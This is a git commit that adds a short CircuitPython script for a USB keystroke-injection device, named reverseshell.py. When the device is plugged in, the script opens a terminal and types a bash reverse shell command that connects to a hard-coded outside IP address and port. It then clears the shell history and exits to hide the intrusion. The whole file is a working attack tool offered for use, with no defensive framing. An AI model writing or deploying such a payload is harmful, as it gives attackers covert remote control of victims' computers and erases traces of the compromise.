40c547cf0457202c419f7dee77cb7c4119cedab9
L?00110011 <liapotikyan006@gmail.com>
2024-06-26 21:36:03 +0400

    Add files via upload

---
+++ reverseshell.py
@@ -0,0 +1,26 @@
+import time
+import usb_hid
+from adafruit_hid.keyboard import Keyboard
+from adafruit_hid.keycode import Keycode
+from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS
+
+kbd = Keyboard(usb_hid.devices)
+layout = KeyboardLayoutUS(kbd)
+
+time.sleep(1)
+
+kbd.press(Keycode.CONTROL, Keycode.ALT)
+kbd.press(Keycode.T)
+kbd.release_all()
+time.sleep(1)
+
+reverse_shell_command = 'bash -c "bash -i >& /dev/tcp/143.110.151.11/12345 0>&1 & disown"'
+layout.write(f'{reverse_shell_command}' + '\n')
+
+
+layout.write('history -c\n')
+kbd.press(Keycode.ENTER)
+kbd.release_all()
+
+layout.write('exit\n')
+
